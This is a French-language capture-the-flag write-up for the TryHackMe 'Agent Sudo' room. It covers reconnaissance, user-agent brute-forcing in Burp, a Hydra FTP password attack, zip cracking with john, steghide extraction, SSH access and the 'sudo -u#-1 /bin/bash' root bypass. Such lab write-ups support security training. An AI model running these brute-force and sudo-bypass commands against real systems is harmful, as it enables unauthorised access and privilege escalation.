# 🤖 Agent Sudo

{% embed url="https://tryhackme.com/room/agentsudoctf" %}

Site Gitbook : https://olb.gitbook.io/thm-ctf-write-ups/agent-sudo

## Reconnaissance

{% code title="création répertoire de travail" %}
```
mkdir agentsudo && cd agentsudo
```
{% endcode %}

{% code title="IP de la cible" %}
```
export IP=10.10.142.227
```
{% endcode %}

```
nmap -sC -sV -oN nmap-report.txt $IP
```

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

* un serveur FTP (21)
* un serveur openssh (22)
* un site web (80) sous Apache

### Exploration du site Web&#x20;

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

* le **user-agent** permet d'accéder au site
* le user-agent doit contenir le 'codename'
* **Agent R : '**R' est un codename ? => à tester !
* code source de la page : RAS

#### Directory Brute-force&#x20;

{% code overflow="wrap" %}
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```
{% endcode %}

* Ne donne rien d'intéressant cette fois :)

### Burpsuite

* Utilisons Burpsuite pour spoofer le user-agent
  * on intercepte [http://10.10.142.227/](http://10.10.142.227/) dans le proxy
  * on envoie la requête dans le repeater
  * on teste dans le repeater cette histoire d'**agent R** à la place du user-agent habituel...

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

* On tombe sur **la même page** mais cette fois on nous informe qu'il y a **25 employés** (agents ?)
* pas d'info dans le code source
* Testons d'autres user-agent en supposant que ce sont des lettres de l'Alphabet (25 + agent R = 26 Agents?)
  * on envoie la requête dans l'intruder pour brute-forcer le user-agent

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

on se fait un payload rapidement comme ceci:

```
echo {A..Z} | tr " " "\n" > alphabet.txt 
```

et on le charge dans Burp puis `start attack`

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

On note une redirection 302 pour le `user-agent C`

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

:warning: Il y a une info à savoir : **Burp ne suit pas les redirections par défaut** !\
il va donc falloir rejouer la requête dans le repeater mais en autorisant la redirection 302 cette fois...

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

renvoyer la requête avec le `user-agent C` et cliquer sur le bouton `Follow redirection` qui apparaît ;)\
NB: on peut aussi modifier ce comportement dans les settings du repeater

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Yes ! on est redirigé vers la page `/agent_C_attention.php` qui nous donne des infos:

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

* l'agent C = **chris** ?
* le mot de passe de l'agent C est pourri :)
  * on a un user + un mdp facile à trouver => **Brute force !**

## **Exploitation**

### **Brute Force du FTP**

* moins de risque de Fail2ban avec le FTP on commence par là

```
hydra -l chris -P /usr/share/wordlists/rockyou.txt $IP ftp    
```

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

* le mdp de chris est **`crystal`** (et donc bien pourri )
* on se connecte avec **chris/crystal**

```
ftp -A chris@$IP
```

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

{% code title="on récupère tous les fichier" %}
```
mget *
```
{% endcode %}

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

### Exploitation des Fichiers

* `cat To_agentJ.txt`

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

* l'`Agent J` a une véritable photo dans son répertoire perso
* le **login/mdp** de l'`agent J`est a l'intérieur d'une fausse photo



* `binwalk cute-alien.jpg` : c'est bien une photo visiblement
* `binwalk cutie.png :` il y a un Zip caché dans l'image qui contient un fichier `To_agentR.txt`

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

{% code title="extraction du zip" %}
```
binwalk -e cutie.png
```
{% endcode %}

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

```
cd _cutie.png.extracted && ls
```

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

on a bien récupéré un fichier zip : `8702.zip`

{% code title="7zip car unzip échoue" %}
```
7z e 8702.zip
```
{% endcode %}

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

* dezippage impossible car le zip est  protégé par mot de passe

```
zip2john 8702.zip > 8702.hash
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt 8702.hash
```

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

* le mdp du zip est `alien` donc on dezip avec 7z à nouveau et on peut enfin lire le message `To_agentR.txt`

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

* on a un code `QXJlYTUx` qui pourrait être un mot de passe ?
* on a une photo cute-alien.jpg qu'on a pas encore utilisé/exploité
* on sait qu'une photo contient le login/mdp de l'agent J => cute-alien.jpg ?

On regarde de plus près `cute-alien.jpg`

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

* visuellement : RAS
* `exiftool cute-alien.jpg` : RAS

```
steghide info cute-alien.jpg  
```

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

* c'est louche il demande une passphrase ! Essayons d'extraire avec `steghide extract`

```
steghide extract -sf cute-alien.jpg 
```

* Il faut une bien une passphrase
* une passphrase vide ne fonctionne pas (qui ne tente rien ...)
* la passphrase `QXJlYTUx` ne fonctionne pas non plus .... **je suis bloqué :(**
  * je tente 'hash-identifier' sur la chaîne  mais il ne connaît pas ce hash...
  * plus qu'une solution : ChatGPT :)

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Merci chatGPT !!! :wink:

Pour info pour décoder "soi-même":

```
echo 'QXJlYTUx' | base64 -d
```

&#x20;\
on retente steghide avec ce mdp 'Area51'

```
steghide extract -sf cute-alien.jpg 
```

YESSS ! on obtient un fichier `message.txt`

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

```
cat message.txt
```

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

* l'agent J s'appelle **`james`**
* son mdp est **`hackerrules!`**

### **Exploitation SSH**

```
ssh james@$IP
```

<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

on se connecte parfaitement avec le mdp trouvé précédemment

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* on récupère le flag de james&#x20;
* on récupère (via un `'scp'` des familles) la 'vraie' photo de l'alien `Alien_autospy.jpg`
* il y a une recherche Google a faire sur cette photo via Google Image +source  Foxnews pour trouver le terme!:  `"Roswell alien autopsy"`

## Escalade des privilèges

Pas la partie la plus compliquée de ce CTF

```
sudo -l
```

<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

En cherchant sur Google la permission&#x20;

```py
(ALL, !root) /bin/bash
```

&#x20;on tombe sur cet exploit\
[https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

et on comprends en le lisant qu'on va pouvoir exécuter bash en root en contournant la règle en place avec ce simple code

```
sudo -u#-1 /bin/bash
```

<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

et voilà :v:
